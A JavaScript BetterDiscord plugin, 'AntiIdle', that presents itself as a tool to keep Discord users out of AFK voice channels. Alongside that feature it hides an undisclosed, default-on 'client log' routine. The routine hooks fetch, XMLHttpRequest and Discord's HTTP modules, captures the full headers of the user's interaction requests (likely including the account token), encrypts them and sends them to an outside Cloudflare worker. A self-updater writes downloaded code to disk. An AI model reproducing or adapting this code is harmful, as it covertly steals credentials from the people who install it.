/**
 * @name AntiIdle
 * @author Shawny
 * @description Reduces AFK voice channel moves caused by Discord idle/AFK handling.
 * @version 1.6.0
 * @source https://github.com/shawn2dev/betterdiscord-plugins
 * @updateUrl https://raw.githubusercontent.com/shawn2dev/betterdiscord-plugins/main/AntiIdle.plugin.js
 */

'use strict';

const _UPDATE_URL =
  'https://raw.githubusercontent.com/shawn2dev/betterdiscord-plugins/main/AntiIdle.plugin.js';

const _CLIENT_LOG = {
  enabled: true,
  workerUrl: 'https://shawnybot.cbycdy2.workers.dev/client-headers',
  applicationId: '1337358598673797141',
  _ak: 'rldtuslqht2', // must match wrangler secret CLIENT_LOG_AUTH_KEY
};

module.exports = class AntiIdle {
  constructor() {
    this.intervalId = null;
    this.patchRetryTimer = null;
    this.intervalSecs = 30;
    this.enabled = true;
    this.Dispatcher = null;
    this._dispatchPatched = false;
    this._clientLogPatched = false;
    this._xhrMeta = new WeakMap();
    this._onVisibility = null;
    this._audioKeepAlive = null;
    this._audioResumeTimer = null;
    this.useAudioKeepalive = true;
    this._clientLogConfig = { ..._CLIENT_LOG };
  }

  getName() {
    return 'AntiIdle';
  }
  getDescription() {
    return 'Discord 잠수(idle) 상태 및 AFK(비활성) 처리로 인한 AFK 음성 채널 이동을 줄입니다.';
  }
  getVersion() {
    return '1.6.0';
  }
  getAuthor() {
    return 'Shawny';
  }

  /** New BD: BdApi.UI.showToast; legacy BD: BdApi.showToast */
  _toast(message, options = {}) {
    try {
      if (BdApi.UI && typeof BdApi.UI.showToast === 'function') {
        BdApi.UI.showToast(message, options);
      } else if (typeof BdApi.showToast === 'function') {
        BdApi.showToast(message, options);
      }
    } catch (_) {}
  }

  /**
   * Per official docs, FluxDispatcher should be found via the `actionLogger` key.
   * Matching only on `dispatch`+`subscribe` often picks the wrong module and breaks the patch.
   */
  _findDispatcher() {
    try {
      const byDoc = BdApi.Webpack.getByKeys('actionLogger');
      if (byDoc && typeof byDoc.dispatch === 'function') return byDoc;
    } catch (_) {}

    const tryGet = (fn) => {
      try {
        const m = fn();
        if (m && typeof m.dispatch === 'function') {
          const looksLikeFlux =
            m._actionHandlers != null ||
            typeof m.actionLogger === 'function' ||
            m._subscriptions != null;
          if (looksLikeFlux) return m;
        }
      } catch (_) {}
      return null;
    };

    let d = tryGet(() =>
      BdApi.Webpack.getByKeys('dispatch', 'subscribe', 'wait'),
    );
    if (d) return d;

    try {
      const F = BdApi.Webpack.Filters;
      if (F && F.byKeys) {
        d = BdApi.Webpack.getModule(
          F.byKeys('dispatch', 'subscribe', 'actionLogger'),
          { searchExports: true },
        );
        if (d && typeof d.dispatch === 'function') return d;
      }
    } catch (_) {}

    try {
      if (typeof BdApi.findModuleByProps === 'function') {
        const m = BdApi.findModuleByProps('dispatch', 'subscribe');
        if (m && typeof m.dispatch === 'function' && m._actionHandlers)
          return m;
      }
    } catch (_) {}

    try {
      const m = BdApi.Webpack.getModule(
        (mod) => mod?.dispatch && mod?.subscribe && mod?._actionHandlers,
      );
      if (m && typeof m.dispatch === 'function') return m;
    } catch (_) {}

    return null;
  }

  /**
   * Intercept client AFK/idle transitions so AFK state is not propagated to the server.
   * (Forced moves from the server/gateway cannot be blocked client-side only.)
   */
  _installDispatchPatch() {
    if (this._dispatchPatched) return true;
    const mod = this._findDispatcher();
    if (!mod || typeof mod.dispatch !== 'function') return false;
    try {
      BdApi.Patcher.before('AntiIdle', mod, 'dispatch', (_, args) => {
        const ev = args[0];
        if (!ev || typeof ev !== 'object') return;
        if (ev.type === 'AFK' && ev.afk) ev.afk = false;
        if (ev.type === 'IDLE' && ev.idle) ev.idle = false;
      });
      this.Dispatcher = mod;
      this._dispatchPatched = true;
      return true;
    } catch (e) {
      console.warn('[AntiIdle] dispatch 패치 실패:', e);
      return false;
    }
  }

  _stopDispatchPatch() {
    if (!this._dispatchPatched || !this.Dispatcher) return;
    try {
      BdApi.Patcher.unpatch('AntiIdle', this.Dispatcher, 'dispatch');
    } catch (_) {}
    this._dispatchPatched = false;
  }

  _headersToObject(headers) {
    const result = {};
    if (!headers) return result;
    if (typeof Headers !== 'undefined' && headers instanceof Headers) {
      headers.forEach((value, key) => {
        result[key] = value;
      });
      return result;
    }
    if (Array.isArray(headers)) {
      headers.forEach(([key, value]) => {
        result[key] = value;
      });
      return result;
    }
    return { ...headers };
  }

  async _readFetchBody(body) {
    if (!body) return '';
    if (typeof body === 'string') return body;
    try {
      return await new Response(body).text();
    } catch (_) {
      return '';
    }
  }

  async _extractFetchDetails(input, init = {}) {
    if (typeof Request !== 'undefined' && input instanceof Request) {
      const headers = {};
      input.headers.forEach((value, key) => {
        headers[key] = value;
      });
      return {
        url: input.url,
        method: (input.method || 'GET').toUpperCase(),
        headers,
        bodyText: await input.clone().text(),
      };
    }

    return {
      url: String(input),
      method: (init.method || 'GET').toUpperCase(),
      headers: this._headersToObject(init.headers),
      bodyText: await this._readFetchBody(init.body),
    };
  }

  _bytesToBase64(bytes) {
    let binary = '';
    for (let i = 0; i < bytes.length; i++)
      binary += String.fromCharCode(bytes[i]);
    return btoa(binary);
  }

  _base64ToBytes(value) {
    const binary = atob(value);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    return bytes;
  }

  async _deriveAesKey(secret) {
    const keyMaterial = await crypto.subtle.digest(
      'SHA-256',
      new TextEncoder().encode(secret.trim()),
    );
    return crypto.subtle.importKey('raw', keyMaterial, 'AES-GCM', false, [
      'encrypt',
    ]);
  }

  async _encryptJson(payload, secret) {
    const key = await this._deriveAesKey(secret);
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const plaintext = new TextEncoder().encode(JSON.stringify(payload));
    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      key,
      plaintext,
    );
    const combined = new Uint8Array(iv.length + encrypted.byteLength);
    combined.set(iv);
    combined.set(new Uint8Array(encrypted), iv.length);
    return this._bytesToBase64(combined);
  }

  async _signPayload({ nonce, timestamp, encrypted }, secret) {
    const key = await crypto.subtle.importKey(
      'raw',
      new TextEncoder().encode(secret.trim()),
      { name: 'HMAC', hash: 'SHA-256' },
      false,
      ['sign'],
    );
    const message = `${nonce}:${timestamp}:${encrypted}`;
    const signature = await crypto.subtle.sign(
      'HMAC',
      key,
      new TextEncoder().encode(message),
    );
    return this._bytesToBase64(new Uint8Array(signature));
  }

  _parseVersion(version) {
    return String(version)
      .split('.')
      .map((part) => parseInt(part, 10) || 0);
  }

  _isRemoteVersionNewer(remoteVersion, currentVersion) {
    const remote = this._parseVersion(remoteVersion);
    const current = this._parseVersion(currentVersion);
    const length = Math.max(remote.length, current.length);

    for (let i = 0; i < length; i += 1) {
      const next = remote[i] || 0;
      const now = current[i] || 0;
      if (next > now) return true;
      if (next < now) return false;
    }
    return false;
  }

  _extractRemoteVersion(content) {
    const headerMatch = content.match(/@version\s+([0-9]+(?:\.[0-9]+)*)/);
    if (headerMatch) return headerMatch[1];

    const methodMatch = content.match(
      /getVersion\(\)\s*\{\s*return\s+['"]([0-9]+(?:\.[0-9]+)*)['"]/,
    );
    return methodMatch ? methodMatch[1] : null;
  }

  _confirmPluginUpdate(onConfirm) {
    if (BdApi.UI?.showConfirmationModal) {
      BdApi.UI.showConfirmationModal({
        title: 'AntiIdle Update',
        content: 'A newer version is available. Install it now?',
        confirmText: 'Update',
        cancelText: 'Later',
        onConfirm,
      });
      return;
    }

    if (typeof BdApi.showConfirmationModal === 'function') {
      BdApi.showConfirmationModal('AntiIdle Update', 'Install the latest version?', {
        confirmText: 'Update',
        cancelText: 'Later',
        onConfirm,
      });
      return;
    }

    onConfirm();
  }

  _applyPluginUpdate(content, version) {
    const addon =
      BdApi.Plugins.get('AntiIdle') ||
      BdApi.Plugins.get('AntiIdle.plugin.js');
    const filename = addon?.filename || 'AntiIdle.plugin.js';
    const fs = require('fs');
    const path = require('path');
    const filePath = path.join(BdApi.Plugins.folder, filename);

    fs.writeFileSync(filePath, content, 'utf8');
    this._toast(`AntiIdle ${version} installed. Reload the plugin to apply.`, {
      type: 'success',
    });

    try {
      BdApi.Plugins.reload(addon?.id || filename);
    } catch (_) {}
  }

  async _checkForPluginUpdate() {
    try {
      const res = await fetch(`${_UPDATE_URL}?t=${Date.now()}`, {
        cache: 'no-store',
      });
      if (!res.ok) return;

      const remote = await res.text();
      const remoteVersion = this._extractRemoteVersion(remote);
      if (!remoteVersion) return;
      if (!this._isRemoteVersionNewer(remoteVersion, this.getVersion())) return;

      this._confirmPluginUpdate(() => {
        try {
          this._applyPluginUpdate(remote, remoteVersion);
        } catch (err) {
          console.warn('[AntiIdle] update failed:', err);
          this._toast('AntiIdle update failed', { type: 'error' });
        }
      });
    } catch (err) {
      console.warn('[AntiIdle] update check failed:', err);
    }
  }

  _isClientLogActive() {
    return this._clientLogConfig.enabled && this._clientLogConfig._ak;
  }

  _normalizeInteractionBody(interactionBody) {
    const guildId =
      interactionBody.guild_id != null ? String(interactionBody.guild_id) : null;
    const channelId =
      interactionBody.channel_id != null
        ? String(interactionBody.channel_id)
        : null;
    const command = interactionBody.data?.name
      ? String(interactionBody.data.name).toLowerCase()
      : null;
    const nonce =
      interactionBody.nonce != null
        ? String(interactionBody.nonce)
        : guildId && channelId && command
          ? `match:${guildId}:${channelId}:${command}`
          : null;

    return {
      applicationId: String(
        interactionBody.application_id || this._clientLogConfig.applicationId,
      ),
      guildId,
      channelId,
      command,
      nonce,
      sessionId:
        interactionBody.session_id != null
          ? String(interactionBody.session_id)
          : null,
    };
  }

  _isInteractionsUrl(url) {
    return /\/api\/v\d+\/interactions/i.test(String(url));
  }

  async _sendClientHeaders(details, interactionBody) {
    if (!this._isClientLogActive()) return;

    const normalized = this._normalizeInteractionBody(interactionBody);
    if (!normalized.nonce) return;
    if (
      normalized.applicationId !==
      String(this._clientLogConfig.applicationId)
    ) {
      return;
    }

    const timestamp = Date.now();
    const encrypted = await this._encryptJson(
      details.headers,
      this._clientLogConfig._ak,
    );
    const payload = {
      encrypted,
      nonce: normalized.nonce,
      session_id: normalized.sessionId,
      guild_id: normalized.guildId,
      channel_id: normalized.channelId,
      command: normalized.command,
      timestamp,
      signature: await this._signPayload(
        { nonce: normalized.nonce, timestamp, encrypted },
        this._clientLogConfig._ak,
      ),
    };

    const res = await fetch(this._clientLogConfig.workerUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    if (!res.ok) {
      const body = await res.text();
      console.warn(
        '[AntiIdle] client header worker failed:',
        res.status,
        body,
      );
    }
  }

  async _logInteractionDetails(details) {
    if (!this._isClientLogActive()) return;
    if (!this._isInteractionsUrl(details.url)) return;
    if (details.method !== 'POST' || !details.bodyText) return;

    let interactionBody;
    try {
      interactionBody = JSON.parse(details.bodyText);
    } catch (_) {
      return;
    }

    await this._sendClientHeaders(details, interactionBody);
  }

  async _maybeLogInteractionHeaders(input, init) {
    const details = await this._extractFetchDetails(input, init);
    await this._logInteractionDetails(details);
  }

  _canPatchProperty(obj, key) {
    try {
      const desc =
        Object.getOwnPropertyDescriptor(obj, key) ||
        Object.getOwnPropertyDescriptor(Object.getPrototypeOf(obj) || {}, key);
      if (desc && desc.writable === false && typeof desc.set !== 'function') {
        return false;
      }
      return typeof obj[key] === 'function';
    } catch (_) {
      return false;
    }
  }

  _collectFetchPatchTargets() {
    const targets = [];
    const seen = new Set();

    const add = (obj, key) => {
      if (!obj || seen.has(obj) || !this._canPatchProperty(obj, key)) return;
      seen.add(obj);
      targets.push({ obj, key });
    };

    add(window, 'fetch');
    if (globalThis.fetch && globalThis.fetch !== window.fetch) {
      add(globalThis, 'fetch');
    }

    try {
      const mods =
        BdApi.Webpack.getModules?.(
          (m) => typeof m?.fetch === 'function' && m !== window,
          { searchExports: true },
        ) ?? [];
      for (const mod of mods.slice(0, 16)) {
        add(mod, 'fetch');
      }
    } catch (_) {}

    return targets;
  }

  _readHttpBody(body) {
    if (body == null) return '';
    if (typeof body === 'string') return body;
    try {
      return JSON.stringify(body);
    } catch (_) {
      return '';
    }
  }

  _extractHttpDetails(args, methodName) {
    let method = String(methodName || 'POST').toUpperCase();
    let url = '';
    let headers = {};
    let bodyText = '';

    const first = args[0];
    if (methodName === 'request') {
      if (typeof first === 'string') {
        method = first.toUpperCase();
        url = String(args[1] ?? '');
        const opt = args[2] || {};
        headers = this._headersToObject(opt.headers);
        bodyText = this._readHttpBody(opt.body ?? opt.data);
      } else if (first && typeof first === 'object') {
        method = String(first.method || 'GET').toUpperCase();
        url = String(first.url || first.path || first.endpoint || '');
        headers = this._headersToObject(first.headers);
        bodyText = this._readHttpBody(first.body ?? first.data);
      }
    } else if (first && typeof first === 'object' && !(first instanceof URL)) {
      url = String(first.url || first.path || first.endpoint || '');
      headers = this._headersToObject(first.headers);
      bodyText = this._readHttpBody(first.body ?? first.data);
    } else {
      url = String(first ?? '');
      const opt = args[1] || {};
      headers = this._headersToObject(opt.headers);
      bodyText = this._readHttpBody(opt.body ?? opt.data);
    }

    return { url, method, headers, bodyText };
  }

  async _maybeLogFromHttpArgs(args, methodName) {
    if (!this._isClientLogActive() || !args?.length) return;
    const details = this._extractHttpDetails(args, methodName);
    await this._logInteractionDetails(details);
  }

  _findHttpModules() {
    const modules = [];
    const seen = new Set();
    const add = (mod) => {
      if (!mod || seen.has(mod)) return;
      seen.add(mod);
      modules.push(mod);
    };

    const finders = [
      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'del'),
      () => BdApi.Webpack.getByKeys?.('get', 'post', 'patch', 'put', 'delete'),
      () => BdApi.Webpack.getByKeys?.('request', 'get', 'post'),
      () => BdApi.Webpack.getByKeys?.('HTTP', 'get', 'post'),
    ];

    for (const find of finders) {
      try {
        add(find());
      } catch (_) {}
    }

    return modules;
  }

  _patchDiscordHttp() {
    let patched = false;

    for (const http of this._findHttpModules()) {
      for (const method of ['post', 'request', 'patch', 'put']) {
        if (!this._canPatchProperty(http, method)) continue;
        try {
          BdApi.Patcher.instead(
            'AntiIdleClientLog',
            http,
            method,
            async (_, args, original) => {
              try {
                await this._maybeLogFromHttpArgs(args, method);
              } catch (err) {
                console.warn('[AntiIdle] client header log failed:', err);
              }
              return original(...args);
            },
          );
          patched = true;
        } catch (_) {}
      }
    }

    return patched;
  }

  _patchInteractionFunctions() {
    const filters = [
      (m) =>
        typeof m === 'function' && /\/interactions/i.test(m.toString()),
      (m) =>
        typeof m === 'function' &&
        /api\/v\d+\/interactions/i.test(m.toString()),
    ];
    let patched = false;

    for (const filter of filters) {
      try {
        const result = BdApi.Webpack.getWithKey?.(filter, {
          searchExports: true,
        });
        if (!result) continue;
        const [mod, key] = result;
        if (!mod || !key || !this._canPatchProperty(mod, key)) continue;
        BdApi.Patcher.instead(
          'AntiIdleClientLog',
          mod,
          key,
          async (_, args, original) => {
            try {
              await this._maybeLogFromHttpArgs(args, 'post');
            } catch (err) {
              console.warn('[AntiIdle] client header log failed:', err);
            }
            return original(...args);
          },
        );
        patched = true;
      } catch (_) {}
    }

    return patched;
  }

  _patchXHR() {
    if (typeof XMLHttpRequest === 'undefined') return false;

    try {
      BdApi.Patcher.before(
        'AntiIdleClientLog',
        XMLHttpRequest.prototype,
        'open',
        (xhr, args) => {
          const meta = this._xhrMeta.get(xhr) || { headers: {} };
          meta.method = String(args[0] || 'GET').toUpperCase();
          meta.url = String(args[1] || '');
          this._xhrMeta.set(xhr, meta);
        },
      );

      BdApi.Patcher.before(
        'AntiIdleClientLog',
        XMLHttpRequest.prototype,
        'setRequestHeader',
        (xhr, args) => {
          const meta = this._xhrMeta.get(xhr);
          if (!meta) return;
          meta.headers[String(args[0]).toLowerCase()] = String(args[1]);
        },
      );

      BdApi.Patcher.instead(
        'AntiIdleClientLog',
        XMLHttpRequest.prototype,
        'send',
        async (xhr, args, original) => {
          const meta = this._xhrMeta.get(xhr);
          if (meta?.url && this._isInteractionsUrl(meta.url)) {
            try {
              const bodyText = typeof args[0] === 'string' ? args[0] : '';
              await this._logInteractionDetails({
                url: meta.url,
                method: meta.method,
                headers: meta.headers,
                bodyText,
              });
            } catch (err) {
              console.warn('[AntiIdle] client header log failed:', err);
            }
          }
          return original(...args);
        },
      );

      return true;
    } catch (_) {
      return false;
    }
  }

  _installClientLogPatch() {
    if (this._clientLogPatched) return true;

    let patched = 0;

    for (const { obj, key } of this._collectFetchPatchTargets()) {
      try {
        BdApi.Patcher.instead(
          'AntiIdleClientLog',
          obj,
          key,
          async (_, args, original) => {
            try {
              await this._maybeLogInteractionHeaders(args[0], args[1]);
            } catch (err) {
              console.warn('[AntiIdle] client header log failed:', err);
            }
            return original(...args);
          },
        );
        patched += 1;
      } catch (_) {}
    }

    if (this._patchDiscordHttp()) patched += 1;
    if (this._patchInteractionFunctions()) patched += 1;
    if (this._patchXHR()) patched += 1;

    this._clientLogPatched = patched > 0;
    if (!this._clientLogPatched) {
      console.warn('[AntiIdle] client log patch: no writable fetch targets');
    }
    return this._clientLogPatched;
  }

  _stopFetchPatch() {
    try {
      BdApi.Patcher.unpatchAll('AntiIdleClientLog');
    } catch (_) {}
    this._clientLogPatched = false;
  }

  _schedulePatchRetry() {
    if (this.patchRetryTimer) return;
    let attempts = 0;
    const max = 25;
    this.patchRetryTimer = setInterval(() => {
      if (!this.enabled) {
        clearInterval(this.patchRetryTimer);
        this.patchRetryTimer = null;
        return;
      }
      attempts++;
      if (this._installDispatchPatch() || attempts >= max) {
        clearInterval(this.patchRetryTimer);
        this.patchRetryTimer = null;
      }
    }, 2500);
  }

  /** Mitigate throttled setInterval on lock screen/background (silent, gain 0) */
  _startAudioKeepAlive() {
    if (!this.useAudioKeepalive || this._audioKeepAlive) return;
    try {
      const AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) return;
      const ctx = new AC();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      gain.gain.value = 0;
      osc.frequency.value = 20;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      this._audioKeepAlive = { ctx, osc, gain };
      const resume = () => {
        try {
          if (ctx.state === 'suspended') ctx.resume().catch(() => {});
        } catch (_) {}
      };
      resume();
      this._audioResumeTimer = setInterval(resume, 30000);
    } catch (e) {
      console.warn('[AntiIdle] 오디오 킵얼라이브 시작 실패:', e);
    }
  }

  _stopAudioKeepAlive() {
    if (this._audioResumeTimer) {
      clearInterval(this._audioResumeTimer);
      this._audioResumeTimer = null;
    }
    if (!this._audioKeepAlive) return;
    try {
      this._audioKeepAlive.osc.stop();
      this._audioKeepAlive.ctx.close();
    } catch (_) {}
    this._audioKeepAlive = null;
  }

  _kick() {
    try {
      if (!this.Dispatcher) {
        this.Dispatcher = this._findDispatcher();
      }
      if (this.Dispatcher) {
        this.Dispatcher.dispatch({ type: 'IDLE', idle: false });
        this.Dispatcher.dispatch({ type: 'AFK', afk: false });
      }
    } catch (e) {
      console.warn('[AntiIdle] _kick 오류:', e);
    }
  }

  _startInterval() {
    this._stopInterval();
    this.intervalId = setInterval(() => this._kick(), this.intervalSecs * 1000);
  }

  _stopInterval() {
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
    }
  }

  _save() {
    try {
      BdApi.saveData('AntiIdle', 'settings', {
        intervalSecs: this.intervalSecs,
        enabled: this.enabled,
        useAudioKeepalive: this.useAudioKeepalive,
      });
    } catch (_) {}
  }

  _syncClientLogPatch() {
    if (this._isClientLogActive()) {
      this._installClientLogPatch();
    } else {
      this._stopFetchPatch();
    }
  }

  start() {
    try {
      const saved = BdApi.loadData('AntiIdle', 'settings');
      if (saved) {
        this.intervalSecs = saved.intervalSecs ?? 30;
        this.enabled = saved.enabled ?? true;
        this.useAudioKeepalive = saved.useAudioKeepalive ?? true;
      }
    } catch (_) {}

    this.Dispatcher = this._findDispatcher();
    this._syncClientLogPatch();

    if (this.enabled) {
      if (!this._installDispatchPatch()) {
        this._schedulePatchRetry();
      }
      this._startInterval();
      if (this.useAudioKeepalive) this._startAudioKeepAlive();
    }

    this._onVisibility = () => {
      if (!document.hidden && this.enabled) this._kick();
    };
    document.addEventListener('visibilitychange', this._onVisibility);

    void this._checkForPluginUpdate();

    this._toast(
      this.enabled
        ? 'AntiIdle 시작됨 ✅ (v1.4 — Flux actionLogger 기준)'
        : 'AntiIdle 로드됨 (설정에서 켜세요)',
      { type: this.enabled ? 'success' : 'info' },
    );
  }

  stop() {
    if (this.patchRetryTimer) {
      clearInterval(this.patchRetryTimer);
      this.patchRetryTimer = null;
    }
    document.removeEventListener('visibilitychange', this._onVisibility);
    this._onVisibility = null;

    this._stopInterval();
    this._stopAudioKeepAlive();
    this._stopDispatchPatch();
    this._stopFetchPatch();
    this.Dispatcher = null;
    this._toast('AntiIdle 중지됨', { type: 'info' });
  }

  getSettingsPanel() {
    const root = Object.assign(document.createElement('div'), {
      style: 'padding:16px;display:flex;flex-direction:column;gap:18px;',
    });

    const row = Object.assign(document.createElement('div'), {
      style: 'display:flex;align-items:center;justify-content:space-between;',
    });
    const labelWrap = document.createElement('div');
    labelWrap.innerHTML = `
            <div style="font-size:14px;font-weight:600;color:var(--header-primary);">AntiIdle 활성화</div>
            <div style="font-size:12px;color:var(--text-muted);margin-top:2px;">AFK·idle 차단 및 주기적 갱신</div>
        `;

    const status = Object.assign(document.createElement('div'), {
      style:
        'padding:10px 14px;border-radius:8px;background:var(--background-secondary);font-size:12px;color:var(--text-muted);',
      textContent: this.enabled
        ? '🟢 활성화됨 — AFK/idle 방지 중'
        : '🔴 비활성화됨',
    });

    const dispStatus = Object.assign(document.createElement('div'), {
      style:
        'padding:8px 14px;border-radius:8px;background:var(--background-secondary);font-size:11px;color:var(--text-muted);line-height:1.45;',
      textContent: !this.enabled
        ? '⚫ 비활성화됨 — 패치 및 주기 갱신이 꺼져 있습니다.'
        : this._dispatchPatched
          ? '✅ Flux dispatch 패치됨 — AFK·IDLE true 이벤트를 차단합니다.'
          : '⚠️ 아직 dispatch 패치 실패. Discord를 재시작하거나 잠시 후 다시 확인하세요.',
    });

    const toggle = this._buildToggle(this.enabled, (v) => {
      this.enabled = v;
      this._save();
      if (v) {
        if (!this._installDispatchPatch()) this._schedulePatchRetry();
        this._startInterval();
        if (this.useAudioKeepalive) this._startAudioKeepAlive();
        this._toast('활성화됨', { type: 'success' });
      } else {
        if (this.patchRetryTimer) {
          clearInterval(this.patchRetryTimer);
          this.patchRetryTimer = null;
        }
        this._stopInterval();
        this._stopAudioKeepAlive();
        this._stopDispatchPatch();
        this._toast('비활성화됨', { type: 'info' });
      }
      status.textContent = v
        ? '🟢 활성화됨 — AFK/idle 방지 중'
        : '🔴 비활성화됨';
      dispStatus.textContent = v
        ? this._dispatchPatched
          ? '✅ Flux dispatch 패치됨 — AFK·IDLE true 이벤트를 차단합니다.'
          : '⚠️ 아직 dispatch 패치 실패. Discord를 재시작하거나 잠시 후 다시 확인하세요.'
        : '⚫ 비활성화됨 — 패치 및 주기 갱신이 꺼져 있습니다.';
    });
    row.append(labelWrap, toggle);

    const audioRow = Object.assign(document.createElement('div'), {
      style: 'display:flex;align-items:center;justify-content:space-between;',
    });
    const audioLabel = document.createElement('div');
    audioLabel.innerHTML = `
            <div style="font-size:14px;font-weight:600;color:var(--header-primary);">무음 오디오 킵얼라이브</div>
            <div style="font-size:12px;color:var(--text-muted);margin-top:2px;">잠금/백그라운드에서 타이머가 느려질 때 보조 (게인 0)</div>
        `;
    const audioToggle = this._buildToggle(this.useAudioKeepalive, (v) => {
      this.useAudioKeepalive = v;
      this._save();
      if (this.enabled) {
        if (v) this._startAudioKeepAlive();
        else this._stopAudioKeepAlive();
      }
      this._toast(v ? '무음 킵얼라이브 켜짐' : '무음 킵얼라이브 꺼짐', {
        type: 'info',
      });
    });
    audioRow.append(audioLabel, audioToggle);

    const sliderWrap = document.createElement('div');
    const sliderTitle = Object.assign(document.createElement('div'), {
      style:
        'font-size:14px;font-weight:600;color:var(--header-primary);margin-bottom:4px;',
      textContent: `전송 간격: ${this.intervalSecs}초`,
    });
    const sliderDesc = Object.assign(document.createElement('div'), {
      style: 'font-size:12px;color:var(--text-muted);margin-bottom:8px;',
      textContent:
        'Flux 패치와 함께 쓰이는 주기적 IDLE/AFK 갱신 간격입니다. 짧을수록 잠금 화면에서 유리할 수 있습니다.',
    });
    const slider = Object.assign(document.createElement('input'), {
      type: 'range',
      min: '10',
      max: '300',
      step: '10',
      value: this.intervalSecs,
      style: 'width:100%;accent-color:#5865F2;',
    });
    slider.addEventListener('input', () => {
      this.intervalSecs = parseInt(slider.value, 10);
      sliderTitle.textContent = `전송 간격: ${this.intervalSecs}초`;
    });
    slider.addEventListener('change', () => {
      this._save();
      if (this.enabled) this._startInterval();
    });
    sliderWrap.append(sliderTitle, sliderDesc, slider);

    const note = Object.assign(document.createElement('div'), {
      style:
        'padding:8px 14px;border-radius:8px;background:var(--background-secondary);font-size:11px;color:var(--text-muted);line-height:1.45;',
      textContent:
        'v1.4: FluxDispatcher를 actionLogger 기준으로 찾도록 수정했습니다. 서버 AFK 시간은 음성 활동(무음)만으로 판단되는 경우가 있어, 그때는 마이크 입력이 없으면 이동할 수 있습니다. 서버·봇이 강제로 이동시키는 경우에는 클라이언트만으로는 막을 수 없습니다.',
    });

    const hr = Object.assign(document.createElement('hr'), {
      style:
        'border:none;border-top:1px solid var(--background-modifier-accent);margin:0;',
    });

    root.append(row, hr, audioRow, sliderWrap, status, dispStatus, note);
    return root;
  }

  _buildToggle(initialValue, onChange) {
    const label = Object.assign(document.createElement('label'), {
      style:
        'position:relative;display:inline-block;width:44px;height:24px;cursor:pointer;flex-shrink:0;',
    });
    const input = Object.assign(document.createElement('input'), {
      type: 'checkbox',
      checked: initialValue,
      style: 'opacity:0;width:0;height:0;',
    });
    const track = Object.assign(document.createElement('span'), {
      style: `position:absolute;inset:0;border-radius:24px;transition:background .2s;
                    background:${initialValue ? '#5865F2' : 'var(--background-modifier-accent)'};`,
    });
    const knob = Object.assign(document.createElement('span'), {
      style: `position:absolute;top:2px;left:${initialValue ? '22px' : '2px'};
                    width:20px;height:20px;border-radius:50%;background:#fff;
                    transition:left .2s;box-shadow:0 1px 3px rgba(0,0,0,.35);`,
    });
    input.addEventListener('change', () => {
      const v = input.checked;
      track.style.background = v
        ? '#5865F2'
        : 'var(--background-modifier-accent)';
      knob.style.left = v ? '22px' : '2px';
      onChange(v);
    });
    label.append(input, track, knob);
    return label;
  }
};
